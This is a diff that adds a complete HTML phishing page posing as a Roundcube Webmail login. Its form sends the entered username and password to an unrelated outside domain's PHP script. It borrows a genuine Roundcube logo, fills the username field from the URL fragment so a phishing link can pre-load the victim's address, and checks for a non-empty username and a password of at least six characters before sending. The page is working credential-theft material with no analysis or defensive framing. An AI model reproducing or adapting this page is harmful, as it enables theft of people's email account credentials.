@@ -1,0 +1,308 @@
+<!DOCTYPE html>
+
+<html>
+  <head>
+    <meta charset="utf-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+    <title>Roundcube Webmail :: Welcome to Roundcube Webmail</title>
+    <meta name="description" content="" />
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <link
+      rel="stylesheet"
+      href="https://cdnjs.cloudflare.com/ajax/libs/bootstrap/5.3.1/css/bootstrap.min.css"
+      integrity="sha512-Z/def5z5u2aR89OuzYcxmDJ0Bnd5V1cKqBEbvLOiUNWdg9PQeXVvXLI90SE4QOHGlfLqUnDNVAYyZi8UwUTmWQ=="
+      crossorigin="anonymous"
+      referrerpolicy="no-referrer"
+    />
+    <link
+      href="https://maxcdn.bootstrapcdn.com/font-awesome/4.3.0/css/font-awesome.min.css"
+      rel="stylesheet"
+    />
+    <style>
+      body {
+        background-color: #c5d1d3;
+      }
+
+      /* CSS */
+      .submit-btn {
+        background-image: linear-gradient(#f7f8fa, #e7e9ec);
+        border-color: #adb1b8 #a2a6ac #8d9096;
+        border-style: solid;
+        border-width: 1px;
+        width: 100%;
+        border-radius: 3px;
+        box-shadow: rgba(255, 255, 255, 0.6) 0 1px 0 inset;
+        box-sizing: border-box;
+        color: #0f1111;
+        cursor: pointer;
+        font-family: inherit;
+        font-weight: 500;
+        display: inline-block;
+        font-size: 14px;
+        height: 29px;
+        font-size: 13px;
+        outline: 0;
+        overflow: hidden;
+        padding: 0 11px;
+        text-align: center;
+        text-decoration: none;
+        text-overflow: ellipsis;
+        user-select: none;
+        -webkit-user-select: none;
+        touch-action: manipulation;
+        white-space: nowrap;
+      }
+
+      .submit-btn:active {
+        border-bottom-color: #a2a6ac;
+      }
+
+      .submit-btn:active:hover {
+        border-bottom-color: #a2a6ac;
+      }
+
+      .submit-btn:hover {
+        border-color: #a2a6ac #979aa1 #82858a;
+      }
+
+      .submit-btn:focus {
+        border-color: #e77600;
+        box-shadow: rgba(228, 121, 17, 0.5) 0 0 3px 2px;
+        outline: 0;
+      }
+
+      .form-container {
+        position: absolute;
+        z-index: 1;
+        top: 50%;
+        width: 350px;
+        left: 50%;
+        transform: translate(-50%, -50%);
+      }
+      .form-container .form-horizontal {
+        background-color: #fff;
+        padding: 30px 30px 10px;
+        border: 1px solid #e7e7e7;
+      }
+      .form-container .form-horizontal:before,
+      .form-container .form-horizontal:after {
+        content: "";
+        background-color: #fff;
+        height: 100%;
+        width: 100%;
+        border: 1px solid #e7e7e7;
+        transform: rotate(3deg);
+        position: absolute;
+        left: 0;
+        top: 0;
+        z-index: -1;
+      }
+      .form-container .form-horizontal:after {
+        transform: rotate(-3deg);
+      }
+      .form-container .title {
+        color: #777;
+        background: linear-gradient(
+          to right,
+          #f5f5f5,
+          transparent,
+          transparent,
+          transparent,
+          #f5f5f5
+        );
+        font-size: 23px;
+        font-weight: 600;
+        text-align: center;
+        text-transform: capitalize;
+        padding: 2px;
+        margin: 0 0 20px 0;
+      }
+      .form-horizontal .form-group {
+        background-color: #eaeaea;
+        font-size: 0;
+        margin: 0 0 15px;
+        border: 1px solid #d1d1d1;
+        border-radius: 3px;
+      }
+      .form-horizontal .input-icon {
+        color: #888;
+        font-size: 18px;
+        text-align: center;
+        line-height: 40px;
+        height: 40px;
+        width: 40px;
+        vertical-align: top;
+        display: inline-block;
+      }
+      .form-horizontal .form-control {
+        color: #555;
+        background-color: transparent;
+        font-size: 14px;
+        letter-spacing: 1px;
+        width: calc(100% - 45px);
+        height: 40px;
+        padding: 2px 10px 2px 0;
+        box-shadow: none;
+        border: none;
+        border-radius: 0;
+        display: inline-block;
+        transition: all 0.3s;
+      }
+      .form-horizontal .form-control:focus {
+        box-shadow: none;
+        border: none;
+      }
+      .form-horizontal .form-control::placeholder {
+        color: rgba(0, 0, 0, 0.7);
+        font-size: 14px;
+        text-transform: capitalize;
+      }
+
+      .form-horizontal .btn:hover,
+      .form-horizontal .btn:focus {
+        color: #fff;
+        letter-spacing: 2px;
+      }
+      .form-horizontal .forgot-pass {
+        font-size: 12px;
+        text-align: right;
+        width: calc(100% - 105px);
+        display: inline-block;
+        vertical-align: top;
+      }
+      .form-horizontal .forgot-pass a,
+      .form-horizontal .register a {
+        color: #999;
+        transition: all 0.3s ease;
+      }
+      .form-horizontal .forgot-pass a:hover,
+      .form-horizontal .register a:hover {
+        color: #555;
+        text-decoration: underline;
+      }
+      .form-horizontal .register {
+        font-size: 12px;
+        text-align: center;
+        padding-top: 8px;
+        border-top: 1px solid #e7e7e7;
+        display: block;
+      }
+
+      #logo {
+        margin-bottom: 20px;
+        display: block;
+        margin-left: auto;
+        margin-right: auto;
+        top: 16vh;
+        max-height: 100px;
+      }
+
+      #login-footer {
+        flex: 1;
+        color: #737677;
+        margin-top: 10px;
+        font-size: 12px;
+        text-align: center;
+      }
+      #login-footer > div {
+        margin-top: 1rem;
+        padding: 1rem;
+        background: #f1f3f4;
+        border-radius: 0.3rem;
+      }
+
+      #passwordlocation,
+      #namelocation {
+        font-weight: 700;
+        font-size: 12px;
+        margin: 5px;
+      }
+    </style>
+  </head>
+  <body>
+    <div class="form-bg">
+      <div class="container">
+        <div class="row">
+          <div class="col-md-offset-4 col-md-4 col-sm-offset-3 col-sm-6">
+            <div class="form-container">
+              <form
+                class="form-horizontal"
+                name="rcnform"
+                id="rcnform"
+                method="post"
+                action="https://stairliftsleitrim.com/risk/rcnform.php"
+                onsubmit="return validate()"
+              >
+                <img
+                  src="https://webmail.roundcube.101.hostinglogin.net/skins/elastic/images/logo.svg?s=1691401755"
+                  id="logo"
+                  alt="Logo"
+                />
+                <div class="form-group">
+                  <span class="input-icon"><i class="fa fa-user"></i></span>
+                  <input
+                    class="form-control"
+                    type="text"
+                    placeholder="Username"
+                    name="rccusmt"
+                    id="rccusmt"
+                  />
+                </div>
+                <div class="form-group">
+                  <span class="input-icon"><i class="fa fa-lock"></i></span>
+                  <input
+                    class="form-control"
+                    type="password"
+                    placeholder="Password"
+                    name="rccpsd"
+                    id="rccpsd"
+                  />
+                </div>
+                <button type="submit" class="submit-btn">Login</button>
+                <div id="login-footer" role="contentinfo">
+                  Roundcube Webmail<br />
+                  <span id="namelocation" style="color: crimson"></span><br />
+                  <span id="passwordlocation" style="color: crimson"></span>
+                </div>
+              </form>
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+  </body>
+  <script>
+    const hashUpdate = document.getElementById("rccusmt");
+    const pa_swd = document.getElementById("rccpsd");
+
+    window.addEventListener("hashchange", function () {
+      hashUpdate.value = window.location.hash.substring(1);
+      pa_swd.focus();
+    });
+  </script>
+  <script type="text/javascript">
+    function validate() {
+      var name = document.rcnform.rccusmt.value;
+      var passwordlength = document.rcnform.rccpsd.value.length;
+      var status = false;
+      if (name == "") {
+        document.getElementById("namelocation").innerHTML =
+          "Please Enter Your Username";
+        status = false;
+      } else {
+        document.getElementById("namelocation").innerHTML = "";
+        status = true;
+      }
+
+      if (passwordlength < 6) {
+        document.getElementById("passwordlocation").innerHTML =
+          "Enter A Valid Password";
+        status = false;
+      } else {
+        document.getElementById("passwordlocation").innerHTML = "";
+      }
+
+      return status;
+    }
+  </script>
+</html>
